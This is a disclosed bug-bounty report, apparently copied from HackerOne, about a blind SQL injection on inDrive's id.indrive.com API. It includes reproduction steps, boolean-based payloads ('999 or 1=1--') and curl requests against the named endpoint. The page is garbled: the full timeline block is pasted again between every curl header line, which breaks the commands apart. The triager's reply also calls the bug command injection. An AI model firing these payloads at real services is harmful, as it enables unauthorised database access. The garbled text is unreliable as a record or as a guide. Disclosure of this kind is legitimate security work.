---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/blind-sql-injection
  - env/web
substate: "resolved"
weakness: "Blind SQL Injection"
enriched: true
body: true
date: 2023-11-24
submitted: 2023-07-06T06:47:53.690Z
bounty_usd: 4134
votes: 199
cve: []
program: "[[programs/indrive|inDrive]]"
reporter: "kristoferent"
source: "https://hackerone.com/reports/2051931"
title: "Blind SQL injection on id.indrive.com"
---
# Blind SQL injection on id.indrive.com

> **Severity:** Critical | **Bounty:** 4,134 USD | **Votes:** 199 | **Program:** inDrive | **Disclosed:** 2023-11-24

- Report: [https://hackerone.com/reports/2051931](https://hackerone.com/reports/2051931)
- CWE: Blind SQL Injection
- Submitted: 2023-07-06T06:47:53.690Z

## Report summary

Subscribe to our telegram channel with updates https://t.me/indrive_bbp

A blind SQL injection was found on id.indrive.com that allowed an attacker to retrieve information from the database by using conditional responses.

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary:
The server does not perform sanitization on user input, allowing an attacker to inject arbitrary SQL commands into a query.

## Steps To Reproduce:

  1. Go to https://promo.indrive.com/10ridestogetprize_ru/random
  2. Click "Сгенерировать". A request to https://id.indrive.com/api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/29/5/phone will be made:

████████
 3. Repeat this request, but change the path to: 
```
/api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/1/999%20or%201=1--
```
A random entry from the database will be returned:

████
  4. Change the path in a query to:
```
/api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/1/999%20or%201=2--
```
The response from the server will be empty:

███████

**Both requests in curl format**
```
curl -i -s -k -X 

- **Report Filed**
- **Report Triaged**
- **2023-07-06** @kristoferent: Promo code: happy_birthday_indrive10
- **2023-07-06** @majesttic: Hello, this problem with command injection was mitigated with a temporary workaround. A final fix is under development.
- **Report Severity Updated**
- **Bounty Awarded**
- **2023-07-12** @majesttic: Great job, @kristoferent! Looking forward to more cool bug reports from you! 

P.S. Also subscribe to our Telegram channel with updates - https://t.me/indrive_bbp.
- **2023-07-12** @kristoferent: Thank you for the generous bounty! Glad to be working with you.
- **Report Resolved**
- **2023-10-25** @kristoferent: The issue is fixed. https://promo.indrive.com/10ridestogetprize_ru/random now requires a password, and the previously affected endpoint no longer exists.
- **Agreed On Going Public**
- **2023-11-24** @kristoferent: You can disclose this report
- **Agreed On Going Public**
- **Report Became Public**
GET' \
    -H 

- **Report Filed**
- **Report Triaged**
- **2023-07-06** @kristoferent: Promo code: happy_birthday_indrive10
- **2023-07-06** @majesttic: Hello, this problem with command injection was mitigated with a temporary workaround. A final fix is under development.
- **Report Severity Updated**
- **Bounty Awarded**
- **2023-07-12** @majesttic: Great job, @kristoferent! Looking forward to more cool bug reports from you! 

P.S. Also subscribe to our Telegram channel with updates - https://t.me/indrive_bbp.
- **2023-07-12** @kristoferent: Thank you for the generous bounty! Glad to be working with you.
- **Report Resolved**
- **2023-10-25** @kristoferent: The issue is fixed. https://promo.indrive.com/10ridestogetprize_ru/random now requires a password, and the previously affected endpoint no longer exists.
- **Agreed On Going Public**
- **2023-11-24** @kristoferent: You can disclose this report
- **Agreed On Going Public**
- **Report Became Public**
Host: id.indrive.com' -H 

- **Report Filed**
- **Report Triaged**
- **2023-07-06** @kristoferent: Promo code: happy_birthday_indrive10
- **2023-07-06** @majesttic: Hello, this problem with command injection was mitigated with a temporary workaround. A final fix is under development.
- **Report Severity Updated**
- **Bounty Awarded**
- **2023-07-12** @majesttic: Great job, @kristoferent! Looking forward to more cool bug reports from you! 

P.S. Also subscribe to our Telegram channel with updates - https://t.me/indrive_bbp.
- **2023-07-12** @kristoferent: Thank you for the generous bounty! Glad to be working with you.
- **Report Resolved**
- **2023-10-25** @kristoferent: The issue is fixed. https://promo.indrive.com/10ridestogetprize_ru/random now requires a password, and the previously affected endpoint no longer exists.
- **Agreed On Going Public**
- **2023-11-24** @kristoferent: You can disclose this report
- **Agreed On Going Public**
- **Report Became Public**
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 

- **Report Filed**
- **Report Triaged**
- **2023-07-06** @kristoferent: Promo code: happy_birthday_indrive10
- **2023-07-06** @majesttic: Hello, this problem with command injection was mitigated with a temporary workaround. A final fix is under development.
- **Report Severity Updated**
- **Bounty Awarded**
- **2023-07-12** @majesttic: Great job, @kristoferent! Looking forward to more cool bug reports from you! 

P.S. Also subscribe to our Telegram channel with updates - https://t.me/indrive_bbp.
- **2023-07-12** @kristoferent: Thank you for the generous bounty! Glad to be working with you.
- **Report Resolved**
- **2023-10-25** @kristoferent: The issue is fixed. https://promo.indrive.com/10ridestogetprize_ru/random now requires a password, and the previously affected endpoint no longer exists.
- **Agreed On Going Public**
- **2023-11-24** @kristoferent: You can disclose this report
- **Agreed On Going Public**
- **Report Became Public**
Accept: application/json, text/plain, */*' -H 

- **Report Filed**
- **Report Triaged**
- **2023-07-06** @kristoferent: Promo code: happy_birthday_indrive10
- **2023-07-06** @majesttic: Hello, this problem with command injection was mitigated with a temporary workaround. A final fix is under development.
- **Report Severity Updated**
- **Bounty Awarded**
- **2023-07-12** @majesttic: Great job, @kristoferent! Looking forward to more cool bug reports from you! 

P.S. Also subscribe to our Telegram channel with updates - https://t.me/indrive_bbp.
- **2023-07-12** @kristoferent: Thank you for the generous bounty! Glad to be working with you.
- **Report Resolved**
- **2023-10-25** @kristoferent: The issue is fixed. https://promo.indrive.com/10ridestogetprize_ru/random now requires a password, and the previously affected endpoint no longer exists.
- **Agreed On Going Public**
- **2023-11-24** @kristoferent: You can disclose this report
- **Agreed On Going Public**
- **Report Became Public**
Accept-Language: en-US,en;q=0.5' -H 

- **Report Filed**
- **Report Triaged**
- **2023-07-06** @kristoferent: Promo code: happy_birthday_indrive10
- **2023-07-06** @majesttic: Hello, this problem with command injection was mitigated with a temporary workaround. A final fix is under development.
- **Report Severity Updated**
- **Bounty Awarded**
- **2023-07-12** @majesttic: Great job, @kristoferent! Looking forward to more cool bug reports from you! 

P.S. Also subscribe to our Telegram channel with updates - https://t.me/indrive_bbp.
- **2023-07-12** @kristoferent: Thank you for the generous bounty! Glad to be working with you.
- **Report Resolved**
- **2023-10-25** @kristoferent: The issue is fixed. https://promo.indrive.com/10ridestogetprize_ru/random now requires a password, and the previously affected endpoint no longer exists.
- **Agreed On Going Public**
- **2023-11-24** @kristoferent: You can disclose this report
- **Agreed On Going Public**
- **Report Became Public**
Accept-Encoding: gzip, deflate' -H 

- **Report Filed**
- **Report Triaged**
- **2023-07-06** @kristoferent: Promo code: happy_birthday_indrive10
- **2023-07-06** @majesttic: Hello, this problem with command injection was mitigated with a temporary workaround. A final fix is under development.
- **Report Severity Updated**
- **Bounty Awarded**
- **2023-07-12** @majesttic: Great job, @kristoferent! Looking forward to more cool bug reports from you! 

P.S. Also subscribe to our Telegram channel with updates - https://t.me/indrive_bbp.
- **2023-07-12** @kristoferent: Thank you for the generous bounty! Glad to be working with you.
- **Report Resolved**
- **2023-10-25** @kristoferent: The issue is fixed. https://promo.indrive.com/10ridestogetprize_ru/random now requires a password, and the previously affected endpoint no longer exists.
- **Agreed On Going Public**
- **2023-11-24** @kristoferent: You can disclose this report
- **Agreed On Going Public**
- **Report Became Public**
Origin: https://promo.indrive.com' -H 

- **Report Filed**
- **Report Triaged**
- **2023-07-06** @kristoferent: Promo code: happy_birthday_indrive10
- **2023-07-06** @majesttic: Hello, this problem with command injection was mitigated with a temporary workaround. A final fix is under development.
- **Report Severity Updated**
- **Bounty Awarded**
- **2023-07-12** @majesttic: Great job, @kristoferent! Looking forward to more cool bug reports from you! 

P.S. Also subscribe to our Telegram channel with updates - https://t.me/indrive_bbp.
- **2023-07-12** @kristoferent: Thank you for the generous bounty! Glad to be working with you.
- **Report Resolved**
- **2023-10-25** @kristoferent: The issue is fixed. https://promo.indrive.com/10ridestogetprize_ru/random now requires a password, and the previously affected endpoint no longer exists.
- **Agreed On Going Public**
- **2023-11-24** @kristoferent: You can disclose this report
- **Agreed On Going Public**
- **Report Became Public**
Referer: https://promo.indrive.com/' -H 

- **Report Filed**
- **Report Triaged**
- **2023-07-06** @kristoferent: Promo code: happy_birthday_indrive10
- **2023-07-06** @majesttic: Hello, this problem with command injection was mitigated with a temporary workaround. A final fix is under development.
- **Report Severity Updated**
- **Bounty Awarded**
- **2023-07-12** @majesttic: Great job, @kristoferent! Looking forward to more cool bug reports from you! 

P.S. Also subscribe to our Telegram channel with updates - https://t.me/indrive_bbp.
- **2023-07-12** @kristoferent: Thank you for the generous bounty! Glad to be working with you.
- **Report Resolved**
- **2023-10-25** @kristoferent: The issue is fixed. https://promo.indrive.com/10ridestogetprize_ru/random now requires a password, and the previously affected endpoint no longer exists.
- **Agreed On Going Public**
- **2023-11-24** @kristoferent: You can disclose this report
- **Agreed On Going Public**
- **Report Became Public**
Sec-Fetch-Dest: empty' -H 

- **Report Filed**
- **Report Triaged**
- **2023-07-06** @kristoferent: Promo code: happy_birthday_indrive10
- **2023-07-06** @majesttic: Hello, this problem with command injection was mitigated with a temporary workaround. A final fix is under development.
- **Report Severity Updated**
- **Bounty Awarded**
- **2023-07-12** @majesttic: Great job, @kristoferent! Looking forward to more cool bug reports from you! 

P.S. Also subscribe to our Telegram channel with updates - https://t.me/indrive_bbp.
- **2023-07-12** @kristoferent: Thank you for the generous bounty! Glad to be working with you.
- **Report Resolved**
- **2023-10-25** @kristoferent: The issue is fixed. https://promo.indrive.com/10ridestogetprize_ru/random now requires a password, and the previously affected endpoint no longer exists.
- **Agreed On Going Public**
- **2023-11-24** @kristoferent: You can disclose this report
- **Agreed On Going Public**
- **Report Became Public**
Sec-Fetch-Mode: cors' -H 

- **Report Filed**
- **Report Triaged**
- **2023-07-06** @kristoferent: Promo code: happy_birthday_indrive10
- **2023-07-06** @majesttic: Hello, this problem with command injection was mitigated with a temporary workaround. A final fix is under development.
- **Report Severity Updated**
- **Bounty Awarded**
- **2023-07-12** @majesttic: Great job, @kristoferent! Looking forward to more cool bug reports from you! 

P.S. Also subscribe to our Telegram channel with updates - https://t.me/indrive_bbp.
- **2023-07-12** @kristoferent: Thank you for the generous bounty! Glad to be working with you.
- **Report Resolved**
- **2023-10-25** @kristoferent: The issue is fixed. https://promo.indrive.com/10ridestogetprize_ru/random now requires a password, and the previously affected endpoint no longer exists.
- **Agreed On Going Public**
- **2023-11-24** @kristoferent: You can disclose this report
- **Agreed On Going Public**
- **Report Became Public**
Sec-Fetch-Site: same-site' -H 

- **Report Filed**
- **Report Triaged**
- **2023-07-06** @kristoferent: Promo code: happy_birthday_indrive10
- **2023-07-06** @majesttic: Hello, this problem with command injection was mitigated with a temporary workaround. A final fix is under development.
- **Report Severity Updated**
- **Bounty Awarded**
- **2023-07-12** @majesttic: Great job, @kristoferent! Looking forward to more cool bug reports from you! 

P.S. Also subscribe to our Telegram channel with updates - https://t.me/indrive_bbp.
- **2023-07-12** @kristoferent: Thank you for the generous bounty! Glad to be working with you.
- **Report Resolved**
- **2023-10-25** @kristoferent: The issue is fixed. https://promo.indrive.com/10ridestogetprize_ru/random now requires a password, and the previously affected endpoint no longer exists.
- **Agreed On Going Public**
- **2023-11-24** @kristoferent: You can disclose this report
- **Agreed On Going Public**
- **Report Became Public**
Te: trailers' -H 

- **Report Filed**
- **Report Triaged**
- **2023-07-06** @kristoferent: Promo code: happy_birthday_indrive10
- **2023-07-06** @majesttic: Hello, this problem with command injection was mitigated with a temporary workaround. A final fix is under development.
- **Report Severity Updated**
- **Bounty Awarded**
- **2023-07-12** @majesttic: Great job, @kristoferent! Looking forward to more cool bug reports from you! 

P.S. Also subscribe to our Telegram channel with updates - https://t.me/indrive_bbp.
- **2023-07-12** @kristoferent: Thank you for the generous bounty! Glad to be working with you.
- **Report Resolved**
- **2023-10-25** @kristoferent: The issue is fixed. https://promo.indrive.com/10ridestogetprize_ru/random now requires a password, and the previously affected endpoint no longer exists.
- **Agreed On Going Public**
- **2023-11-24** @kristoferent: You can disclose this report
- **Agreed On Going Public**
- **Report Became Public**
Connection: close' \
    

- **Report Filed**
- **Report Triaged**
- **2023-07-06** @kristoferent: Promo code: happy_birthday_indrive10
- **2023-07-06** @majesttic: Hello, this problem with command injection was mitigated with a temporary workaround. A final fix is under development.
- **Report Severity Updated**
- **Bounty Awarded**
- **2023-07-12** @majesttic: Great job, @kristoferent! Looking forward to more cool bug reports from you! 

P.S. Also subscribe to our Telegram channel with updates - https://t.me/indrive_bbp.
- **2023-07-12** @kristoferent: Thank you for the generous bounty! Glad to be working with you.
- **Report Resolved**
- **2023-10-25** @kristoferent: The issue is fixed. https://promo.indrive.com/10ridestogetprize_ru/random now requires a password, and the previously affected endpoint no longer exists.
- **Agreed On Going Public**
- **2023-11-24** @kristoferent: You can disclose this report
- **Agreed On Going Public**
- **Report Became Public**
https://id.indrive.com/api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/1/999%20or%201=1--'
```
```
curl -i -s -k -X 

- **Report Filed**
- **Report Triaged**
- **2023-07-06** @kristoferent: Promo code: happy_birthday_indrive10
- **2023-07-06** @majesttic: Hello, this problem with command injection was mitigated with a temporary workaround. A final fix is under development.
- **Report Severity Updated**
- **Bounty Awarded**
- **2023-07-12** @majesttic: Great job, @kristoferent! Looking forward to more cool bug reports from you! 

P.S. Also subscribe to our Telegram channel with updates - https://t.me/indrive_bbp.
- **2023-07-12** @kristoferent: Thank you for the generous bounty! Glad to be working with you.
- **Report Resolved**
- **2023-10-25** @kristoferent: The issue is fixed. https://promo.indrive.com/10ridestogetprize_ru/random now requires a password, and the previously affected endpoint no longer exists.
- **Agreed On Going Public**
- **2023-11-24** @kristoferent: You can disclose this report
- **Agreed On Going Public**
- **Report Became Public**
GET' \
    -H 

- **Report Filed**
- **Report Triaged**
- **2023-07-06** @kristoferent: Promo code: happy_birthday_indrive10
- **2023-07-06** @majesttic: Hello, this problem with command injection was mitigated with a temporary workaround. A final fix is under development.
- **Report Severity Updated**
- **Bounty Awarded**
- **2023-07-12** @majesttic: Great job, @kristoferent! Looking forward to more cool bug reports from you! 

P.S. Also subscribe to our Telegram channel with updates - https://t.me/indrive_bbp.
- **2023-07-12** @kristoferent: Thank you for the generous bounty! Glad to be working with you.
- **Report Resolved**
- **2023-10-25** @kristoferent: The issue is fixed. https://promo.indrive.com/10ridestogetprize_ru/random now requires a password, and the previously affected endpoint no longer exists.
- **Agreed On Going Public**
- **2023-11-24** @kristoferent: You can disclose this report
- **Agreed On Going Public**
- **Report Became Public**
Host: id.indrive.com' -H 

- **Report Filed**
- **Report Triaged**
- **2023-07-06** @kristoferent: Promo code: happy_birthday_indrive10
- **2023-07-06** @majesttic: Hello, this problem with command injection was mitigated with a temporary workaround. A final fix is under development.
- **Report Severity Updated**
- **Bounty Awarded**
- **2023-07-12** @majesttic: Great job, @kristoferent! Looking forward to more cool bug reports from you! 

P.S. Also subscribe to our Telegram channel with updates - https://t.me/indrive_bbp.
- **2023-07-12** @kristoferent: Thank you for the generous bounty! Glad to be working with you.
- **Report Resolved**
- **2023-10-25** @kristoferent: The issue is fixed. https://promo.indrive.com/10ridestogetprize_ru/random now requires a password, and the previously affected endpoint no longer exists.
- **Agreed On Going Public**
- **2023-11-24** @kristoferent: You can disclose this report
- **Agreed On Going Public**
- **Report Became Public**
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 

- **Report Filed**
- **Report Triaged**
- **2023-07-06** @kristoferent: Promo code: happy_birthday_indrive10
- **2023-07-06** @majesttic: Hello, this problem with command injection was mitigated with a temporary workaround. A final fix is under development.
- **Report Severity Updated**
- **Bounty Awarded**
- **2023-07-12** @majesttic: Great job, @kristoferent! Looking forward to more cool bug reports from you! 

P.S. Also subscribe to our Telegram channel with updates - https://t.me/indrive_bbp.
- **2023-07-12** @kristoferent: Thank you for the generous bounty! Glad to be working with you.
- **Report Resolved**
- **2023-10-25** @kristoferent: The issue is fixed. https://promo.indrive.com/10ridestogetprize_ru/random now requires a password, and the previously affected endpoint no longer exists.
- **Agreed On Going Public**
- **2023-11-24** @kristoferent: You can disclose this report
- **Agreed On Going Public**
- **Report Became Public**
Accept: application/json, text/plain, */*' -H 

- **Report Filed**
- **Report Triaged**
- **2023-07-06** @kristoferent: Promo code: happy_birthday_indrive10
- **2023-07-06** @majesttic: Hello, this problem with command injection was mitigated with a temporary workaround. A final fix is under development.
- **Report Severity Updated**
- **Bounty Awarded**
- **2023-07-12** @majesttic: Great job, @kristoferent! Looking forward to more cool bug reports from you! 

P.S. Also subscribe to our Telegram channel with updates - https://t.me/indrive_bbp.
- **2023-07-12** @kristoferent: Thank you for the generous bounty! Glad to be working with you.
- **Report Resolved**
- **2023-10-25** @kristoferent: The issue is fixed. https://promo.indrive.com/10ridestogetprize_ru/random now requires a password, and the previously affected endpoint no longer exists.
- **Agreed On Going Public**
- **2023-11-24** @kristoferent: You can disclose this report
- **Agreed On Going Public**
- **Report Became Public**
Accept-Language: en-US,en;q=0.5' -H 

- **Report Filed**
- **Report Triaged**
- **2023-07-06** @kristoferent: Promo code: happy_birthday_indrive10
- **2023-07-06** @majesttic: Hello, this problem with command injection was mitigated with a temporary workaround. A final fix is under development.
- **Report Severity Updated**
- **Bounty Awarded**
- **2023-07-12** @majesttic: Great job, @kristoferent! Looking forward to more cool bug reports from you! 

P.S. Also subscribe to our Telegram channel with updates - https://t.me/indrive_bbp.
- **2023-07-12** @kristoferent: Thank you for the generous bounty! Glad to be working with you.
- **Report Resolved**
- **2023-10-25** @kristoferent: The issue is fixed. https://promo.indrive.com/10ridestogetprize_ru/random now requires a password, and the previously affected endpoint no longer exists.
- **Agreed On Going Public**
- **2023-11-24** @kristoferent: You can disclose this report
- **Agreed On Going Public**
- **Report Became Public**
Accept-Encoding: gzip, deflate' -H 

- **Report Filed**
- **Report Triaged**
- **2023-07-06** @kristoferent: Promo code: happy_birthday_indrive10
- **2023-07-06** @majesttic: Hello, this problem with command injection was mitigated with a temporary workaround. A final fix is under development.
- **Report Severity Updated**
- **Bounty Awarded**
- **2023-07-12** @majesttic: Great job, @kristoferent! Looking forward to more cool bug reports from you! 

P.S. Also subscribe to our Telegram channel with updates - https://t.me/indrive_bbp.
- **2023-07-12** @kristoferent: Thank you for the generous bounty! Glad to be working with you.
- **Report Resolved**
- **2023-10-25** @kristoferent: The issue is fixed. https://promo.indrive.com/10ridestogetprize_ru/random now requires a password, and the previously affected endpoint no longer exists.
- **Agreed On Going Public**
- **2023-11-24** @kristoferent: You can disclose this report
- **Agreed On Going Public**
- **Report Became Public**
Origin: https://promo.indrive.com' -H 

- **Report Filed**
- **Report Triaged**
- **2023-07-06** @kristoferent: Promo code: happy_birthday_indrive10
- **2023-07-06** @majesttic: Hello, this problem with command injection was mitigated with a temporary workaround. A final fix is under development.
- **Report Severity Updated**
- **Bounty Awarded**
- **2023-07-12** @majesttic: Great job, @kristoferent! Looking forward to more cool bug reports from you! 

P.S. Also subscribe to our Telegram channel with updates - https://t.me/indrive_bbp.
- **2023-07-12** @kristoferent: Thank you for the generous bounty! Glad to be working with you.
- **Report Resolved**
- **2023-10-25** @kristoferent: The issue is fixed. https://promo.indrive.com/10ridestogetprize_ru/random now requires a password, and the previously affected endpoint no longer exists.
- **Agreed On Going Public**
- **2023-11-24** @kristoferent: You can disclose this report
- **Agreed On Going Public**
- **Report Became Public**
Referer: https://promo.indrive.com/' -H 

- **Report Filed**
- **Report Triaged**
- **2023-07-06** @kristoferent: Promo code: happy_birthday_indrive10
- **2023-07-06** @majesttic: Hello, this problem with command injection was mitigated with a temporary workaround. A final fix is under development.
- **Report Severity Updated**
- **Bounty Awarded**
- **2023-07-12** @majesttic: Great job, @kristoferent! Looking forward to more cool bug reports from you! 

P.S. Also subscribe to our Telegram channel with updates - https://t.me/indrive_bbp.
- **2023-07-12** @kristoferent: Thank you for the generous bounty! Glad to be working with you.
- **Report Resolved**
- **2023-10-25** @kristoferent: The issue is fixed. https://promo.indrive.com/10ridestogetprize_ru/random now requires a password, and the previously affected endpoint no longer exists.
- **Agreed On Going Public**
- **2023-11-24** @kristoferent: You can disclose this report
- **Agreed On Going Public**
- **Report Became Public**
Sec-Fetch-Dest: empty' -H 

- **Report Filed**
- **Report Triaged**
- **2023-07-06** @kristoferent: Promo code: happy_birthday_indrive10
- **2023-07-06** @majesttic: Hello, this problem with command injection was mitigated with a temporary workaround. A final fix is under development.
- **Report Severity Updated**
- **Bounty Awarded**
- **2023-07-12** @majesttic: Great job, @kristoferent! Looking forward to more cool bug reports from you! 

P.S. Also subscribe to our Telegram channel with updates - https://t.me/indrive_bbp.
- **2023-07-12** @kristoferent: Thank you for the generous bounty! Glad to be working with you.
- **Report Resolved**
- **2023-10-25** @kristoferent: The issue is fixed. https://promo.indrive.com/10ridestogetprize_ru/random now requires a password, and the previously affected endpoint no longer exists.
- **Agreed On Going Public**
- **2023-11-24** @kristoferent: You can disclose this report
- **Agreed On Going Public**
- **Report Became Public**
Sec-Fetch-Mode: cors' -H 

- **Report Filed**
- **Report Triaged**
- **2023-07-06** @kristoferent: Promo code: happy_birthday_indrive10
- **2023-07-06** @majesttic: Hello, this problem with command injection was mitigated with a temporary workaround. A final fix is under development.
- **Report Severity Updated**
- **Bounty Awarded**
- **2023-07-12** @majesttic: Great job, @kristoferent! Looking forward to more cool bug reports from you! 

P.S. Also subscribe to our Telegram channel with updates - https://t.me/indrive_bbp.
- **2023-07-12** @kristoferent: Thank you for the generous bounty! Glad to be working with you.
- **Report Resolved**
- **2023-10-25** @kristoferent: The issue is fixed. https://promo.indrive.com/10ridestogetprize_ru/random now requires a password, and the previously affected endpoint no longer exists.
- **Agreed On Going Public**
- **2023-11-24** @kristoferent: You can disclose this report
- **Agreed On Going Public**
- **Report Became Public**
Sec-Fetch-Site: same-site' -H 

- **Report Filed**
- **Report Triaged**
- **2023-07-06** @kristoferent: Promo code: happy_birthday_indrive10
- **2023-07-06** @majesttic: Hello, this problem with command injection was mitigated with a temporary workaround. A final fix is under development.
- **Report Severity Updated**
- **Bounty Awarded**
- **2023-07-12** @majesttic: Great job, @kristoferent! Looking forward to more cool bug reports from you! 

P.S. Also subscribe to our Telegram channel with updates - https://t.me/indrive_bbp.
- **2023-07-12** @kristoferent: Thank you for the generous bounty! Glad to be working with you.
- **Report Resolved**
- **2023-10-25** @kristoferent: The issue is fixed. https://promo.indrive.com/10ridestogetprize_ru/random now requires a password, and the previously affected endpoint no longer exists.
- **Agreed On Going Public**
- **2023-11-24** @kristoferent: You can disclose this report
- **Agreed On Going Public**
- **Report Became Public**
Te: trailers' -H 

- **Report Filed**
- **Report Triaged**
- **2023-07-06** @kristoferent: Promo code: happy_birthday_indrive10
- **2023-07-06** @majesttic: Hello, this problem with command injection was mitigated with a temporary workaround. A final fix is under development.
- **Report Severity Updated**
- **Bounty Awarded**
- **2023-07-12** @majesttic: Great job, @kristoferent! Looking forward to more cool bug reports from you! 

P.S. Also subscribe to our Telegram channel with updates - https://t.me/indrive_bbp.
- **2023-07-12** @kristoferent: Thank you for the generous bounty! Glad to be working with you.
- **Report Resolved**
- **2023-10-25** @kristoferent: The issue is fixed. https://promo.indrive.com/10ridestogetprize_ru/random now requires a password, and the previously affected endpoint no longer exists.
- **Agreed On Going Public**
- **2023-11-24** @kristoferent: You can disclose this report
- **Agreed On Going Public**
- **Report Became Public**
Connection: close' \
    

- **Report Filed**
- **Report Triaged**
- **2023-07-06** @kristoferent: Promo code: happy_birthday_indrive10
- **2023-07-06** @majesttic: Hello, this problem with command injection was mitigated with a temporary workaround. A final fix is under development.
- **Report Severity Updated**
- **Bounty Awarded**
- **2023-07-12** @majesttic: Great job, @kristoferent! Looking forward to more cool bug reports from you! 

P.S. Also subscribe to our Telegram channel with updates - https://t.me/indrive_bbp.
- **2023-07-12** @kristoferent: Thank you for the generous bounty! Glad to be working with you.
- **Report Resolved**
- **2023-10-25** @kristoferent: The issue is fixed. https://promo.indrive.com/10ridestogetprize_ru/random now requires a password, and the previously affected endpoint no longer exists.
- **Agreed On Going Public**
- **2023-11-24** @kristoferent: You can disclose this report
- **Agreed On Going Public**
- **Report Became Public**
https://id.indrive.com/api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/1/999%20or%201=2--'
```

## Impact

This vulnerability allows attackers to inject any SQL statements into a query.
For example, I was able to retrieve the SQL version:
**PostgreSQL 14.8 (Ubuntu 14.8-0ubuntu0.22.04.1)**

## Timeline

- **Report Filed**
- **Report Triaged**
- **2023-07-06** @kristoferent: Promo code: happy_birthday_indrive10
- **2023-07-06** @majesttic: Hello, this problem with command injection was mitigated with a temporary workaround. A final fix is under development.
- **Report Severity Updated**
- **Bounty Awarded**
- **2023-07-12** @majesttic: Great job, @kristoferent! Looking forward to more cool bug reports from you! 

P.S. Also subscribe to our Telegram channel with updates - https://t.me/indrive_bbp.
- **2023-07-12** @kristoferent: Thank you for the generous bounty! Glad to be working with you.
- **Report Resolved**
- **2023-10-25** @kristoferent: The issue is fixed. https://promo.indrive.com/10ridestogetprize_ru/random now requires a password, and the previously affected endpoint no longer exists.
- **Agreed On Going Public**
- **2023-11-24** @kristoferent: You can disclose this report
- **Agreed On Going Public**
- **Report Became Public**
